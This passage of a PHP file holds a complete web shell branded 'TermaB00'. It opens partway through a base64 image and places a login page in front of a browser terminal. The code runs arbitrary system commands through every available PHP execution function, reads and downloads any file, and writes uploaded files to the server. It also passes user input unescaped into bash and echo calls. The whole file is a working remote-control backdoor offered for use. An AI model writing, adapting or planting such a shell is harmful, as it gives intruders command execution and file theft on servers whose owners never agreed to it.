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';

// Protect content below with authentication
if (!isAuthenticated()) {
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                background-color: #000;
                margin: 0;
                font-family: Arial, sans-serif;
                color: white;
            }
            .login-container {
                background: #1a1a1a;
                padding: 40px;
                border-radius: 8px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
                width: 100%;
                max-width: 350px;
                text-align: center;
            }
            .login-container h2 {
                margin-bottom: 20px;
                color: #FF5151;
                font-size: 24px;
            }
            .login-container input[type="text"],
            .login-container input[type="password"] {
                width: 80%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #FF5151;
                border-radius: 4px;
                background-color: #1a1a1a;
                color: white;
                font-size: 16px;
                text-align: center;
            }
            .login-container input[type="submit"] {
                width: 85%;
                padding: 10px;
                background-color: #FF5151;
                border: none;
                border-radius: 4px;
                color: white;
                font-size: 16px;
                cursor: pointer;
                transition: background-color 0.3s;
            }
            .login-container input[type="submit"]:hover {
                background-color: #e04b4b;
            }
            .login-container .signup-link {
                margin-top: 20px;
                color: #FF5151;
                cursor: pointer;
                text-decoration: underline;
            }
            .qr-modal {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.8);
                justify-content: center;
                align-items: center;
            }
            .qr-modal img {
                max-width: 90%;
                max-height: 90%;
            }
            .error {
                color: #FF5151;
                margin-top: 10px;
            }
        </style>
        <script>
            function showQRCode() {
                document.getElementById("qrModal").style.display = "flex";
            }
            function hideQRCode() {
                document.getElementById("qrModal").style.display = "none";
            }
        </script>
    </head>
    <body>
        <div class="login-container">
            <h2>W3LC0M3, WH0 4R3 Y0U?</h2>
            <form method="post" action="">
                <input type="text" name="username" placeholder="Username" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <input type="submit" value="Login">
            </form>
            <p class="signup-link" onclick="showQRCode()">I don\'t have an account</p>
            <div class="qr-modal" id="qrModal" onclick="hideQRCode()">
                <img src="' . $qr_code_base64 . '" alt="QR Code for Signup">
            </div>';
    if (isset($error)) {
        echo '<p class="error">' . $error . '</p>';
    }
    echo '</div>
    </body>
    </html>';
    exit;
}

// Original PHP code below this line
$SHELL_CONFIG = array(
    'username' => 't3rm4',
    'hostname' => 'b00',
);

function expandPath($path) {
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        exec("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}

function allFunctionExist($list = array()) {
    foreach ($list as $entry) {
        if (!function_exists($entry)) {
            return false;
        }
    }
    return true;
}

function executeCommand($cmd) {
    $output = '';
    if (function_exists('exec')) {
        exec($cmd, $output);
        $output = implode("\n", $output);
    } else if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
        $handle = popen($cmd, 'r');
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
        $output = stream_get_contents($pipes[1]);
        proc_close($handle);
    }
    return $output;
}

function isRunningWindows() {
    return stripos(PHP_OS, "WIN") === 0;
}

function featureShell($cmd, $cwd) {
    $stdout = "";

    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
        chdir(expandPath("~"));
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir(expandPath($match[1]));
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        $stdout = executeCommand($cmd);
    }

    return array(
        "stdout" => base64_encode($stdout),
        "cwd" => base64_encode(getcwd())
    );
}

function featurePwd() {
    return array("cwd" => base64_encode(getcwd()));
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    foreach ($files as &$filename) {
        $filename = base64_encode($filename);
    }
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => base64_encode('File not found / no read permission.'),
            'cwd' => base64_encode(getcwd())
        );
    } else {
        return array(
            'name' => base64_encode(basename($filePath)),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => base64_encode('Invalid path / no write permission.'),
            'cwd' => base64_encode(getcwd())
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => base64_encode('Done.'),
            'cwd' => base64_encode(getcwd())
        );
    }
}

function initShellConfig() {
    global $SHELL_CONFIG;

    if (isRunningWindows()) {
        $username = getenv('USERNAME');
        if ($username !== false) {
            $SHELL_CONFIG['username'] = $username;
        }
    } else {
        $pwuid = posix_getpwuid(posix_geteuid());
        if ($pwuid !== false) {
            $SHELL_CONFIG['username'] = $pwuid['name'];
        }
    }

    $hostname = gethostname();
    if ($hostname !== false) {
        $SHELL_CONFIG['hostname'] = $hostname;
    }
}

if (isset($_GET["feature"])) {

    $response = NULL;

    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
} else {
    initShellConfig();
}

?><!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title>Terma@B00:~#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
                width: 100vw;
                height: 100vh;
                overflow: hidden;
            }

            *::-webkit-scrollbar-track {
                border-radius: 8px;
                background-color: #353535;
            }

            *::-webkit-scrollbar {
                width: 8px;
                height: 8px;
            }

            *::-webkit-scrollbar-thumb {
                border-radius: 8px;
                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
                background-color: #bcbcbc;
            }

            #shell {
                background: #222;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
                max-width: calc(100vw - 2 * var(--shell-margin));
                max-height: calc(100vh - 2 * var(--shell-margin));
                resize: both;
                overflow: hidden;
                width: 100%;
                height: 100%;
                margin: var(--shell-margin) auto;
            }

            #shell-content {
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }

            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            :root {
                --shell-margin: 25px;
            }

            @media (min-width: 1200px) {
                :root {
                    --shell-margin: 50px !important;
                }
            }

            @media (max-width: 991px),
                   (max-height: 600px) {
                #shell-logo {
                    font-size: 6px;
                    margin: -25px 0;
                }
                :root {
                    --shell-margin: 0 !important;
                }
                #shell {
                    resize: none;
                }
            }

            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }

            @media (max-width: 320px) {
                #shell-logo {
                    font-size: 5px;
                }
            }

            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .shell-prompt > span {
                color: #1BC9E7;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
                padding: 10px 0;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
                box-sizing: border-box;
            }

            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            #shell-input input {
                outline: none;
            }
        </style>

        <script>
            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
            var CWD = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eShellCmdInput = null;
            var eShellContent = null;

            function _insertCommand(command) {
                eShellContent.innerHTML += "\n\n";
                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _insertStdout(stdout) {
                eShellContent.innerHTML += escapeHtml(stdout);
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _defer(callback) {
                setTimeout(callback, 0);
            }

            function featureShell(command) {

                _insertCommand(command);
                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                } else if (/^\s*clear\s*$/.test(command)) {
                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                    eShellContent.innerHTML = '';
                } else {
                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(atob(response.name), response.file)
                        } else {
                            _insertStdout(atob(response.stdout));
                            updateCwd(atob(response.cwd));
                        }
                    });
                }
            }

            function featureHint() {
                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete

                function _requestCallback(data) {
                    if (data.files.length <= 1) return;  // no completion
                    data.files = data.files.map(function(file){
                        return atob(file);
                    });
                    if (data.files.length === 2) {
                        if (type === 'cmd') {
                            eShellCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eShellCmdInput.value;
                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eShellCmdInput.value);
                        _insertStdout(data.files.join("\n"));
                    }
                }

                var currentCmd = eShellCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

                makeRequest(
                    "?feature=hint",
                    {
                        filename: fileName,
                        cwd: CWD,
                        type: type
                    },
                    _requestCallback
                );

            }

            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.');
            }

            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
                            _insertStdout(atob(response.stdout));
                            updateCwd(atob(response.cwd));
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.');
                    });
                });
                element.click();
                document.body.removeChild(element);
            }

            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                }
                return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                makeRequest("?feature=pwd", {}, function(response) {
                    CWD = atob(response.cwd);
                    _updatePrompt();
                });

            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }

            function _onShellCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        featureShell(eShellCmdInput.value);
                        insertToHistory(eShellCmdInput.value);
                        eShellCmdInput.value = "";
                        break;
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eShellCmdInput.blur();
                            eShellCmdInput.value = commandHistory[historyPosition];
                            _defer(function() {
                                eShellCmdInput.focus();
                            });
                        }
                        break;
                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }
                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eShellCmdInput.value = "";
                        } else {
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }

            function insertToHistory(cmd) {
                commandHistory.push(cmd);
                historyPosition = commandHistory.length;
            }

            function makeRequest(url, params, callback) {
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            alert("Error while parsing response: " + error);
                        }
                    }
                };
                xhr.send(getQueryString());
            }

            document.onclick = function(event) {
                event = event || window.event;
                var selection = window.getSelection();
                var target = event.target || event.srcElement;

                if (target.tagName === "SELECT") {
                    return;
                }

                if (!selection.toString()) {
                    eShellCmdInput.focus();
                }
            };

            window.onload = function() {
                eShellCmdInput = document.getElementById("shell-cmd");
                eShellContent = document.getElementById("shell-content");
                updateCwd();
                eShellCmdInput.focus();
            };
        </script>
    </head>

    <body>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">

 _____                        ______  _____  _____  <span></span>
|_   _|                       | ___ \|  _  ||  _  | <span></span>
  | | ___ _ __ _ __ ___   __ _| |_/ /| |/' || |/' | <span></span>
  | |/ _ \ '__| '_ ` _ \ / _` | ___ \|  /| ||  /| | <span></span>
  | |  __/ |  | | | | | | (_| | |_/ /\ |_/ /\ |_/ / <span></span>
  \_/\___|_|  |_| |_| |_|\__,_\____/  \___/  \___/  <span></span>
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
    </body>

</html>
